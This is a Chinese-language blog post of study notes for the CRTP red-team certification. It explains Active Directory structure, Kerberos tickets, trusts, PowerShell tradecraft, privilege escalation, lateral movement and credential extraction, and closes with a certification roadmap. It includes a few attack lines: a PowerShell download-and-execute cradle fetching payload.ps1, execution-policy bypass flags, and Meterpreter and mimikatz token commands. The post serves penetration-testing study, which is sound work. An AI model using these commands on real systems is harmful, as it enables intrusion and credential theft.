---
title: CRTP 學習與策略規劃
date: 2026-02-21
categories:
  - 紅隊
tags : 
  - CRTP
---

## 前言
<br>
CRTP（Certified Red Team Professional）是由 Altered Security 推出的紅隊證照，核心聚焦在 Active Directory 內網攻擊技術。

如果用一句話概括：

```bash=
CRTP 是一張專門針對 AD 攻擊路徑與權限濫用技術的證照。
```

過去的實戰經驗中，內網滲透往往是透過既有漏洞取得初始跳板，例如利用 CVE 進入主機後，直接開始橫向移動與權限提升，最終目標通常也是指向 Active Directory。

整體流程大致為：

```bash=
1day CVE → Webshell → RDP → 關閉防護機制 → 工具利用 → 橫向移動 → 進入 AD
```
這種打法屬於高度結果導向的實戰流程。任務能完成、目標能達成，但回頭檢視會發現，對於 AD 架構本身的設計邏輯、權限模型以及認證機制，理解多半停留在操作層，而非系統層。思考後發現，最大的差異是軍中通常是以目標導向為主，與其只依賴工具與既有手法，不如回頭把 AD 的核心知識與攻擊原理重新整理一次。最近剛好有兩位朋友對 CRTP 感興趣，提議一起準備這張證照，於是決定花時間系統化補齊這一塊。

### CRTP 學習資源與流程

官方網址 : 

```bash= 
https://www.enterprisesecurity.io/
```

成功登入後，可在 Dashboard 中看到 `Attacking and Defending Active Directory Lab - CRTP` 訂閱 Lab。

主要功能區包含：
- Lab Details
- Lab Manual
- Certification Exam
- Flag Verification
- Lab Material
- How to use Discord
- FAQs

其中最核心的學習資源集中在 `Lab Manual`，內容涵蓋課程影片、PDF 教材與相關工具包，是整套 CRTP 的知識主體，其他區塊則偏向環境說明、考試資訊與實驗室操作輔助。

![CRTP-Lab Material](/img/Material.png)

基本學習思路 : 

```bash=
Course Videos
（快速理解整體架構）
        ↓
Lab Connection Guide
（解決 Lab 連線問題）        
        ↓
Access Lab Material
（Lab 驗證）
        ↓
Walkthrough Videos
（僅在卡關時使用）
```

整體原則為：

```bash=
先建立全局架構，再透過 Lab 驗證理解，Walkthrough 僅作為輔助，而非主要學習來源。
```

### 學習效率優化

#### 雙語字幕輔助流程

CRTP 課程皆為全英文解說、無中文字幕，單純硬聽其實效率不高。與其反覆倒帶，不如把問題工程化處理。因此結合 Whisper 與 ChatGPT，先將影片轉為字幕，再進行翻譯與結構化整理，建立一套雙語輔助學習流程。保留技術術語原文，同時提升理解效率。後續也會將整個流程封裝成工具，放上 GitHub，並考慮導入 CI/CD 或容器化，方便長期維護與團隊使用。

因此建立以下流程：

```bash=
Whisper → 產生 SRT → ChatGPT 翻譯 → 結構化整理 → 建立雙語學習素材
```

#### 環境準備

安裝 Whisper :

```bash=
pip install -U openai-whisper
pip install torch
```

執行 Whisper : 

```bash=
Whisper
```

![Whisper](/img/Whisper.png)

下載 full_build.7z 並將 `ffmpeg.exe` 加入環境變數。

```bash=
https://www.gyan.dev/ffmpeg/builds/
```

![ffmpeg](/img/ffmpeg.png)

批量將所有 `.mp4` 檔案轉成 `.srt` 檔案，並存放在 `Course_output_en` 資料夾中。

```bash= 
for %f in (*.mp4) do whisper "%f" --model small --language English --output_dir Course_output_en --output_format srt
```

![批量轉 srt 檔案](/img/srt.png)

轉換時間較長，後續可研究更高效處理方式。

![srt_en](/img/srt_en.png)

接著透過自製工具批量翻譯字幕。

```bash=
https://github.com/zxc7528064/SRT-Translator
```

翻譯後生成 `srt_zh` 檔案，並確認時間軸未發生錯位。

![srt_cn](/img/srt_cn.png)

實際匯入後，字幕與時間同步正常，即可正式進入學習階段。

![sucess_srt_zn](/img/sucess_srt_zn.png)

### Active Directory 攻擊框架

待畫心智圖

### Module 1 
- Introduction to Active Directory and Attack Methodology
- Offensive PowerShell and .NET tradecraft
- Domain Enumeration

![AD_image](/img/AD_image.png)

AD 的核心功能，它提供三大核心能力：
- Manageability（集中管理）
- Security（驗證與授權）
- Interoperability（跨系統整合）

幾乎所有 Windows Server、Client、Application、Email、Network Device 都圍繞 AD 運作。

重點：

```bash=
控制 AD = 控制整個企業環境
```

理解 AD 的結構框架（mental model）

```bash=
Forest
│
├── Schema Partition
│     ├── ObjectClass 定義
│     └── Attribute 定義
│
├── Configuration Partition
│     ├── Sites
│     ├── Services
│     └── Trust Objects
│
└── Domain Partition
      └── Object Tree
            └── Object
                  ├── ObjectClass
                  ├── Attributes (資料欄位)
                  └── Security Descriptor (權限控制)
                        ├── Owner
                        ├── DACL (決定誰可以對這個 Object 做什麼)
                        │     └── ACE
                        └── SACL
```

Schema 與物件屬性 ： Active Directory 本質上是一個「物件導向的目錄資料庫」。

在 AD 中，所有資源都以「物件（Object）」的形式存在，例如：

- User
- Computer
- Group
- Organizational Unit (OU)
- Domain Controller
- Service Account
- GPO

每個物件都包含多個「屬性（Attribute）」，例如：

- sAMAccountName
- userPrincipalName
- memberOf
- objectSID
- servicePrincipalName

| 攻擊類型                   | 關鍵屬性                               | 真正本質              |
| ---------------------- | ---------------------------------------- | ----------------- |
| Kerberoasting          | servicePrincipalName                     | 可讀 SPN + 可請求 TGS  |
| SPN Abuse              | servicePrincipalName                     | 可寫 SPN            |
| Constrained Delegation | msDS-AllowedToDelegateTo                 | 可控制委派目標           |
| RBCD                   | msDS-AllowedToActOnBehalfOfOtherIdentity | 可寫 delegation ACL |
| ACL Abuse              | nTSecurityDescriptor                     | 可改物件權限            |

重點：
```bash=
多數 AD 攻擊建立在「物件 Attribute 屬性 + ACL 權限機制」之上。
```

Domain (網域) ：

公司內部帳號與電腦的管理範圍。

- 每個 Domain 擁有獨立的使用者、電腦與群組物件（User、Computer、Group、Service Account），儲存在該 Domain 的 AD 資料庫（NTDS.dit）中。
- Domain 由一或多台 Domain Controller（DC）維護，負責儲存 AD 資料庫（NTDS.dit）、驗證使用者身分與發放存取權限。
- 預設使用 Kerberos 作為主要驗證機制，在某些情況下（例如舊系統或 SPN 解析失敗）會回退至 NTLM。

Domain 內部通常共享：
- 身份資料庫：所有帳號與群組資訊儲存在 AD 物件中。
- 安全政策（Security Policy）：密碼長度、複雜度、帳號鎖定策略等。
- 群組原則（GPO）：集中套用系統設定與安全設定至電腦與使用者。
- 信任關係（Trust Relationship）：允許跨 Domain 或跨 Forest 的身份驗證與資源存取。

重點：

```bash=
MS-DRSR 協定 : Domain Controller 之間用來同步 Active Directory 資料的官方協定。

Active Directory
      ↓
Replication 機制
      ↓
MS-DRSR 協定
      ↓
DRSUAPI 介面
      ↓
物件屬性資料同步

DCSync：濫用 Directory Replication（目錄複寫）權限，透過 MS-DRSR（DRSUAPI）複寫介面向 Domain Controller，請求帳號屬性資料，可取得 NTLM hash、Kerberos 金鑰與 KRBTGT hash。

DCShadow：濫用 AD 複寫機制，暫時將攻擊主機註冊為一台 Domain Controller，注入惡意物件屬性變更，並透過正常 replication 流程推送至其他 DC。

控制 KRBTGT hash = 可偽造 Kerberos Golden Ticket，偽造任意使用者身份，而整個網域都會相信。
```

Forest（森林）： AD 架構的最高層級。

![Forest](/img/Forest.png)

包含：
- 多個 Domain
- 共用同一個 Schema（所有 Domain 的資料結構都必須一致）
- 共用全域目錄（Global Catalog）
 
重點 :
```bash=
Active Directory 森林權限與信任模型：

Forest
│
├── Schema Partition
├── Configuration Partition
│
├── Forest Root Domain
│      ├── Domain Admins (管理 root domain)
│      ├── Enterprise Admins (森林層級權限)
│      └── Schema Admins (Schema 管理)
│
├── Child Domain A
│      └── Domain Admins
│
└── Child Domain B
       └── Domain Admins

在同一 Forest 內，各 Domain 透過 Parent-Child 與 Tree 架構，形成預設雙向且可傳遞（Transitive）的信任鏈。

Domain A ↔ Domain B ↔ Domain C
        ↑______________↑
         自動形成傳遞信任

Enterprise Admins 存在於 Root Domain，具有管理整個 Forest 結構（Schema、Configuration、Domain）的能力，但實際資源存取仍受各 Domain ACL 控制。
```

在 Active Directory 內網滲透中，PowerShell 與 .NET 是最核心的攻擊載體。

- 理解 PowerShell 在 AD 攻擊中的角色
- 理解 Windows 環境的偵測面
- 理解何時應使用 PowerShell、何時應改用 .NET Binary

為什麼 PowerShell 是 AD 攻擊核心載體 ?

PowerShell 具備：

- 預設安裝於 Windows 系統
- 原生 .NET 支援
- PowerShell 可直接跟 AD 交互（查資料、改資料，而不需要額外工具）
- 支援記憶體執行
- 可直接調用 Windows API

在 AD 內網滲透中，幾乎所有 Enumeration 行為都可透過 PowerShell 完成：

- 列出 User / Group / Computer
- 查詢 SPN
- 查詢 ACL
- 查詢 Delegation
- 查詢 Trust

AD 模組與基本操作

載入 AD 模組：

```bash=
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
Get-Command -Module ActiveDirectory
```

重點：
- 使用 AD 相關 cmdlet
- 進行 Domain Enumeration
- 查詢 user / group / SPN / ACL

記憶體執行（Memory Execution）

```bash=
iex (New-Object Net.WebClient).DownloadString('http://www.webserver/payload.ps1')
```

重點：
- 記憶體載入（fileless execution）
- 不落地執行腳本
- 減少檔案型 AV 偵測

PowerShell Detection Surface（偵測面）

理解防禦面，才能理解攻擊面。

```bash=
System-wide transcription
- 記錄整個 PowerShell 互動過程（指令與輸出）
- 主要用於事後取證

Script Block Logging
- 記錄還原後的完整腳本內容
- 即使混淆或編碼，仍可能被還原記錄
- 重要事件 ID：4104

AMSI (AntiMalware Scan Interface)
- 將腳本內容送交 AV / EDR 掃描
- 屬於即時掃描機制
- 是否阻擋取決於防毒引擎

流程概念：
PowerShell Script
        ↓
AMSI Hook
        ↓
AV / EDR Engine
        ↓
Allow / Block

Constrained Language Mode (CLM)
- 限制 PowerShell 可使用的功能
- 通常與 AppLocker
- 屬於功能限制，而非純偵測機制
```

Execution Policy（執行策略）

常見參數：

```bash= 
powershell -ep bypass
powershell -c <cmd>
powershell -encodedcommand <base64>
或在當前程序中：
Set-ExecutionPolicy Bypass -Scope Process
```

重點：
- 它只是防止誤執行腳本
- 真正的限制來自 AMSI / CLM / AV

Tradecraft 不是工具清單，而是：

- 目標環境是否啟用 Script Block Logging？
- 是否部署 EDR？
- 是否開啟 CLM？
- 是否允許 PowerShell 遠端執行？
- 是否應改用 .NET Binary？

PowerShell 本質是 .NET。

在高監控環境中，可能改用：
- 直接撰寫 C# 工具
- 使用 .NET API 操作 LDAP
- 減少 PowerShell 特徵

常見策略：
- Source Code Obfuscation
- 字串混淆
- API 間接調用
- 編譯為獨立 Binary

混淆與偵測研究工具（研究用途）

工具的價值在於理解偵測邏輯，而非盲目繞過。

- AMSITrigger → 測試哪段程式碼觸發 AMSI
- DefenderCheck → 測試哪段內容被 Defender 標記
- Invoke-Obfuscation → PowerShell 混淆框架
- ConfuserEx → .NET 混淆工具

---

AD 後滲透模型流程：

```bash=
Initial Foothold
      ↓
PowerView 手動枚舉
      ↓
建立 AD 權限模型
      ↓
BloodHound 計算攻擊路徑
      ↓
ACL / Delegation / Credential Abuse
      ↓
Domain Controller Compromise
```

常用工具：

| 工具 | 角色 | 功能定位 |
|------|------|----------|
| PowerView | 手動枚舉 | 查詢 AD 物件與 ACL |
| SharpView | 隱蔽枚舉 | C# 版 AD 枚舉工具，適用於限制 PowerShell 的環境 |
| BloodHound CE | 圖論分析 | 計算最短攻擊路徑 |
| SOAPHound | ADCS 枚舉 | ADCS 與憑證模板關係枚舉工具 |
| PowerHuntShares | 共享枚舉 | 尋找敏感檔案與憑證（GPP密碼、備份檔、設定檔）|
| RunWithRegistryNonAdmin.bat | 執行技巧 | 利用註冊表機制在低權限情境下啟動程式 |

AD / Windows 權限判斷的核心機制：

```bash=
Access Token 對 DACL 中 ACE 的逐條匹配過程，而 Deny 永遠優先。
```

驗證流程：

![ACLs](/img/ACLs.png)

```bash=
使用者登入
     ↓
DC 驗證成功（Kerberos / NTLM）
     ↓
LSASS 建立 Access Token
     ↓
Process 繼承 Access Token
     ↓
嘗試存取 Object
     ↓
讀取 Object 的 DACL
     ↓
逐條比對 ACE
     ↓
命中 Deny → 立即拒絕（Deny 優先）
命中 Allow → 允許
全部未命中 → 拒絕
```

在 Active Directory 中：

```bash=
GPO + OU Link = 批量控制行為的機制
```

重要的是： OU 與 GPO 本身也是受 ACL 控制的物件，可以被濫用的控制節點。

常見濫用權限，如果攻擊者對 OU 具有以下權限：

```bash=
WriteDACL
GenericAll
WriteOwner
```

GPO（Group Policy Object）的本質

```bash=
一種可以套用到 OU / Domain 的設定物件。
```

可以影響：
- 電腦設定
- 使用者設定
- 安全政策
- 啟動腳本
- 登入腳本

簡單說： GPO 是批量控制系統行為的工具。

橫向權限放大流程：

```bash=
取得 OU 控制權（GenericAll / WriteDACL）
        ↓
修改 GPO Link 或建立惡意 GPO
        ↓
修改 GPO 內容（加入惡意設定）
        ↓
等待 Group Policy 更新（gpupdate / 90 min）
        ↓
影響 OU 下所有電腦或使用者
```

Trust 是什麼 ?

```bash=
Trust 是不同 Domain / Forest 之間的身份驗證信任機制。
```

若存在 Trust，代表身份驗證可以跨域流動，攻擊面可能被擴大。

Trust 分析三大維度
- Direction（方向）
- Type（類型）
- Attributes（屬性）

Trust 的方向 ≠ 存取方向

![Trust_Direction](/img/Trust_Direction.png)

代表：左側網域會接受右側網域的身分驗證結果（Authentication）
但實際 Access 實際存取方向：右側網域的使用者 → 左側網域的資源

Direction（方向）：
- One-way trust（單向）→ 只有一側可以跨域驗證
- Two-way trust（雙向）→ 兩側都可以跨域驗證

![Two-way-trust](/img/Two-way-trust.png)

Type（類型）：
- Parent-Child
- Tree-Root
- Forest
- External

Tree-Root：Forest 內的多個 Tree 不是隔離的，而是透過 Root Domain 串接，形成完整可傳遞的信任結構。

![Tree-root-Trust](/img/Tree-root-Trust.png)

External：跨 Forest 的點對點信任，預設不具傳遞性，範圍受限。

![External-Trust](/img/External-Trust.png)

Forest：如果某個 Forest 被攻破，而它和其他 Forest 有 Forest Trust，攻擊面可能會橫向擴散。

![Forest-Trust](/img/Forest-Trust.png)

Attributes（屬性）：

若 A 信任 B，B 信任 C，且該 trust 為 transitive，則 A 會間接信任 C。

A ↔ B ↔ C
↑________↑
自動形成信任鏈

關鍵屬性：
- 是否 Transitive（可傳遞）
- 是否啟用 SID Filtering

![Transitive](/img/Transitive.png)

跨域攻擊決策模型：

```bash=
已控制 Domain A
↓
枚舉 Trust 關係
↓
分析 Direction / Type / Attributes
↓
判斷是否可跨域驗證
↓
尋找跨域可濫用權限
↓
User Hunting（高權限帳號在哪?）
↓
定位落點主機
↓
橫向移動至 Domain B
```

### Module 2 
- Local Privilege Escalation
- Lateral Movement
- Domain Privilege Escalation

當取得初始立足點（Foothold）後，下一個目標通常是：

```bash=
將目前低權限使用者 → 提升為 SYSTEM 或 Local Administrator
```

漏洞型（Patch / Exploit）
利用系統尚未修補的漏洞進行提權，例如：
- Kernel 漏洞
- 已知 Local Privilege Escalation CVE

憑證型（Credential Exposure）
透過系統遺留的明文憑證進行提權。
常見來源包括：
- unattended.xml（自動部署檔）
- 自動登入密碼（AutoLogon）
- Registry 中的明文憑證
- 特殊設備（kiosk / 自動化設備）的內建帳號

設定錯誤型（Misconfiguration）
例如：
- 可覆寫服務 binary
- 可修改服務參數（Unquoted Service Path）
- 過度寬鬆的 Service ACL
- DLL Hijacking
- AlwaysInstallElevated 設定錯誤

由於本地提權可能性眾多，通常會搭配自動化工具進行檢查：
- PowerUp
- winPEAS
- Privesc 系列工具
- AutoLogon 檢查工具

實戰流程通常如下：

```bash=
Foothold
   ↓
檢查系統弱點（Patch / Kernel）
   ↓
檢查憑證殘留（XML / Registry / AutoLogon）
   ↓
檢查 ACL 與服務配置
   ↓
嘗試提升為 SYSTEM
```

本地特權提升的關鍵在於尋找「憑證殘留」與「系統設定錯誤」，而不是單純依賴漏洞。

Feature Abuse（企業服務功能濫用）

```
濫用企業應用程式或服務的功能來取得更高權限。
```

為什麼企業環境容易出現，因為企業內部常存在大量系統：
- DevOps、CI/CD
- 監控系統
- 自動化服務

服務通常安全設計較弱，但卻常常以 `SYSTEM / Administrator` 權限運行。

典型案例：
- Jenkins

早期 Jenkins：
- 預設沒有 Authentication
- 任何人可以存取 console
- 可直接執行 command

攻擊流程：

```bash=
Script Console
↓
Groovy script execution
↓
Command execution on host
```

如果 Jenkins 服務是 SYSTEM 執行 → 直接 SYSTEM shell

NTLM Relaying 核心概念：

```
轉發身份驗證，而不是竊取密碼。
```

攻擊流程：

```bash=
Victim authentication
        ↓
Attacker relay
        ↓
Target service
```

攻擊者只需要轉發 authentication 即可登入目標服務。

GPO Abuse（Group Policy 濫用）核心概念：

```bash=
如果 Group Policy ACL 過於寬鬆，修改 Group Policy 並影響整個網域的電腦。
```

常見 GPO 攻擊方式：

```bash=
修改 GPO
↓
建立 scheduled task
↓
在所有 Domain Computer 執行 payload
```

例如：
- powershell payload
- cmd execution
- 新增 admin user

GPOddity 一種較新的攻擊技術。

攻擊流程：

```bash=
NTLM Relay
      ↓
修改 GPO attribute
      ↓
修改 GPCFileSysPath
      ↓
指向 attacker share
      ↓
Domain computer 載入惡意 policy
```

---

常見的橫向移動技術：
- PSExec
- WMI
- RDP
- SMB
- PowerShell Remoting
- WinRM

其中 **PowerShell Remoting** 是現代 Windows 環境常見的一種方式，運用的底層技術 **WinRM (Windows Remote Management)**
- 透過 PowerShell 遠端控制另一台 Windows 主機

```bash=
Local PowerShell
↓
PowerShell Remoting
↓
WinRM (WS-Management implementation)
↓
Remote Host
↓
wsmprovhost.exe
↓
Remote PowerShell Session
```

特性：
- Windows 原生功能
- 不需要額外工具
- 在企業環境非常常見
- 適合用於 Lateral Movement

Default Ports：

```bash=
5985 → HTTP
5986 → HTTPS
```

建立遠端 session：

```bash=
New-PSSession
```

進入遠端 shell：

```bash=
Enter-PSSession -ComputerName TARGET
```

遠端執行指令：

```bash=
Invoke-Command -ComputerName TARGET -ScriptBlock { command }
```

PowerShell Remoting 會留下以下痕跡：

Process：
- wsmprovhost.exe
- powershell.exe

核心重點：
- PowerShell Remoting 使用 WinRM
- WinRM 使用 5985 / 5986 port
- 成功連線會建立 wsmprovhost.exe
- 取得 Local Administrator 權限可進行 lateral movement

在 Windows 內網滲透（Active Directory 攻擊）中，只要取得 **Local Administrator / SYSTEM 權限**，下一步會進行**Credential Extraction**，目的是取得身份驗證資料，例如：
- NTLM Hash
- Kerberos Ticket
- AES Key
- Plaintext Password
- Cached Credentials

取得憑證後即可進行：
- Pass-the-Hash
- Pass-the-Ticket
- Kerberoasting
- Lateral Movement
- Privilege Escalation

LSASS – Credential 的核心來源

Windows 身份驗證系統由 **LSA (Local Security Authority)** 負責，實際運作的 process 為 **lsass.exe**

LSASS 負責：
- User Authentication
- Kerberos Authentication
- NTLM Authentication
- Security Policy
- Token Creation

當使用者登入系統時，憑證會被載入 **LSASS memory**

常見情境：
- Local login
- RDP login
- RunAs
- Scheduled tasks
- Service login
- Remote administration

從 LSASS 記憶體中通常可以取得：
- NTLM Hash
- Kerberos Tickets
- AES Keys
- Plaintext Password
- WDigest Credentials
- SSP Credentials

常見工具：
- mimikatz
- sekurlsa
- dumpert
- procdump

LSASS 是 Windows 系統中 **最容易被監控的 process** ，因此 Dump LSASS 常會觸發告警。

EDR / Defender 會監控：
- OpenProcess(lsass)
- ReadProcessMemory
- MiniDumpWriteDump
- Process Handle Access

本地帳號 hash 儲存在 registry：
- HKLM\SAM
- HKLM\SYSTEM

取得： Local NTLM Hash

常用工具：
- reg save
- secretsdump.py

LSA Secrets 儲存在 `HKLM\SECURITY` 包含：
- Service account password
- Scheduled task credentials
- Cached domain credentials

Windows Data Protection API 用於加密應用程式憑證。

常見使用：
- Credential Manager
- Browser password
- Browser cookies
- Private keys
- Azure tokens

Windows Credential Manager 儲存各種登入資訊。

工具：
- vaultcmd

取得：
- RDP credentials
- Stored passwords

瀏覽器也常儲存登入資訊。

例如：
- Chrome
- Edge
- Firefox

取得：
- Saved passwords
- Cookies
- Session tokens

PowerShell command history 可能包含憑證。

路徑：`%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

整體 Credential 儲存位置可以整理為：

```bash=
Windows System
│
├─ LSASS memory
│    ├ NTLM Hash
│    ├ Kerberos Ticket
│    ├ Plaintext Password
│
├─ Registry
│    ├ SAM
│    ├ LSA Secrets
│
├─ DPAPI
│    ├ Browser Password
│    ├ Credential Vault
│
├─ Applications
│    ├ Browser Cookies
│    ├ Azure Tokens
│
└─ User Artifacts
     ├ PowerShell History
     ├ Scripts
```

實戰中通常會依據 **Detection Risk** 使用技術。

Low Noise：
- Registry extraction
- DPAPI
- Credential vault
- Browser credential
- PowerShell history

Medium Noise：
- SAM dump
- LSA secrets

High Noise：
- LSASS dump
- Mimikatz

成熟的 Red Team 會優先使用 **Non-LSASS Credential Extraction**

例如：
- SAM
- LSA secrets
- DPAPI
- Credential vault
- Browser credentials

---

Mimikatz 是 AD 內網滲透中最著名的工具之一。

主要用途：
- Credential Dumping
- Pass-the-Hash
- Pass-the-Ticket
- Token Manipulation
- Kerberos Ticket Forgery

常見模組：
- sekurlsa
- lsadump
- kerberos
- token
- privilege

Pass-the-Hash (PtH)： 利用 **NTLM Hash** 進行身份驗證，而不需要知道明文密碼，直接利用該 Hash 登入其他系統。

原理：

```bash=
Password
↓
NTLM Hash
↓
Authentication
```

效果：
- 不需要知道密碼
- 可以模仿使用者登入

Pass-the-Ticket (PtT) 是攻擊者將已取得的 Kerberos Ticket 注入到目前 Session 中，藉此模仿該使用者身份。

Kerberos 基本流程：

```bash=
User
↓
AS (Authentication Service)
↓
TGT
↓
TGS (Ticket Granting Service)
↓
Service Ticket
↓
Service Access
```

如果攻擊者取得 Kerberos Ticket (TGT / TGS) 就可以 Inject ticket，達到 Impersonate user、Access services、Lateral movement。

Golden Ticket 是攻擊者偽造 Kerberos TGT 的技術，用於取得整個 Active Directory Domain 的存取權限。

核心概念：

```bash=
取得 KRBTGT hash
↓
偽造 TGT
↓
模仿任意使用者
```

完整流程：

```
Dump KRBTGT hash
↓
Forge Kerberos TGT
↓
Inject Ticket
↓
Access any resource in domain
```

效果：
- Domain Persistence
- 可偽造任何使用者身份
- Domain Controller 會信任該票證

Silver Ticket 是攻擊者利用服務帳號的 **NTLM hash**，自行偽造 Kerberos Service Ticket (TGS) 來存取特定服務

與 Golden Ticket 不同的是，不需要 **Domain Controller**。

完整流程：

```bash=
取得 Service Account Hash
↓
Forge TGS
↓
Inject Ticket
↓
Access specific service
```

常見服務：

| SPN   | 服務              |
| ----- | ---------------- |
| CIFS  | SMB / File Share |
| HTTP  | Web Server / IIS |
| MSSQL | SQL Server       |
| HOST  | Windows 主機服務  |

特性：
- 不需要聯絡 DC
- 偵測難度較高
- 只影響特定服務

Token Impersonation：
是讓一個 Thread 暫時使用另一個使用者的 Access Token，以該使用者身份存取系統資源。

在 Windows 中：
- Process 會持有 Primary Token (預設身份)
- Thread 可以使用 Impersonation Token (暫時身份)

Access Token 代表 Windows 的 Security Context，包含：
- User SID
      - ex : Administrators
- Group SID
      - ex : Administrators
- Privileges
      - ex : SeDebugPrivilege
- Integrity Level
      - ex : High

**Access Token = 身份 + 群組 + 權限**

Mimikatz 常見操作：

```bash=
token::elevate
```

Meterpreter 常見操作：

```bash=
list_tokens -u
impersonate_token DOMAIN\Administrator
```

Windows Token Privilege Escalation 運作模型

```bash= 
Access Token
↓
SeImpersonatePrivilege
↓
Named Pipe / COM / RPC
↓
Potato Attack
↓
SYSTEM Token
↓
Privilege Escalation
```

在 Windows Privilege Escalation 中，Token Impersonation 常與 **SeImpersonatePrivilege** 或 **SeAssignPrimaryTokenPrivilege** 搭配使用。

---

### Module 3
- Domain Persistensce
- Cross Trust Attacks

### Module 4
- Bypass Defenses (MDE and MDI)
- Monitoring and Detections

本文先記錄學習前的策略規劃，後續將依照實際進度拆解各模組內容。

## Lab Methodology - Assume Breach (實驗室方法論)

預設攻擊者已取得內網初始立足點（Initial Foothold），並是否能沿著攻擊鏈持續擴張權限，最終達成： 

```bash=
控制整個 AD 網域環境
```

Lab 入口資訊
- Portal URL： `https://enterprisesecurity.io`
- 登入後可查看：
  - 訂閱開始與結束時間
  - Lab 存取剩餘時間
  - 最近一次考試嘗試時間

重點：
- 最少 30 天存取權限
- 若時間異常需立即確認
- Lab 時間與考試資格直接相關

區域選擇 (Region Selection)
- North America
- Europe
- East Asia / Pacific

原則：
- 依地理位置選擇最近區域
- 降低延遲 (Latency)
- 確保操作流暢度

## 總結

過去在軍中環境的觀察來說，OSCP 往往已被視為一個相當高的技術門檻，甚至可以說是「頂標」。在那樣的體系裡，能通過 OSCP 已經明顯高於平均水準。但如果放到具有實戰強度的乙方市場環境來看，OSCP 更像是一個起點，而不是終點。它代表的是基本滲透方法論與攻擊流程的建立，如果單純以「紅隊實戰能力成長」為目標，而非證照收藏，可以依照能力堆疊邏輯，規劃如下順序：

```bash=
OSCP → CRTP → OSEP → OSWE → OSED（選修）
```

### 第一階段：建立滲透方法論（OSCP）

OSCP 核心價值在於建立完整的滲透思維與攻擊流程：
- 系統化的 Enumeration
- 攻擊面拆解與優先順序判斷
- 橫向移動與權限提升

這個階段的重點不是招式，而是方法論，從這一步開始，才真正具備「能獨立完成滲透流程」的能力。

### 第二階段：理解企業內網權限模型（CRTP）

CRTP 補足的是企業環境中最核心的 Active Directory 架構理解。
- ACL / DACL 與權限流動
- Kerberos 認證與票證模型
- Delegation 設計邏輯
- Forest / Domain Trust 邊界

這一步讓能力從「會打」轉向「看懂設計」，開始理解攻擊之所以成立，是因為架構本身如何運作。

### 第三階段：真實環境對抗能力（OSEP）

OSEP 強調的是攻防對抗思維。
- AV / EDR 對抗
- AMSI / AppLocker 繞過
- Logging 與 Detection Surface 理解
- Payload 與執行鏈設計

這個階段讓攻擊能力從實驗室場景，進化到真實企業環境，不再只是「能打成功」，而是「能在被監控下打成功」。

### 第四階段：漏洞原理與程式閱讀能力（OSWE）

在具備完整攻擊鏈與對抗能力後，再回頭強化 Web 原始碼審計能力。

OSWE 著重於：
- Source Code Trace
- 邏輯漏洞辨識
- 自行撰寫與修改 exploit

這一層補的是內功，讓滲透能力從黑箱測試，轉為白箱理解。

### 第五階段：底層漏洞利用研究（OSED）

OSED 偏向研究導向與 Exploit Engineering
- ROP Chain
- DEP / ASLR Bypass
- Shellcode 與 Windows Internals

並非一般紅隊必要能力，以目前市場現況而言，多數企業安全檢測仍以黑箱或灰箱滲透測試為主，真正需要底層漏洞利用開發能力的職缺相對較少，但對於希望深入理解漏洞本質或追求 OSCE3 的人而言，可作為長期興趣投入。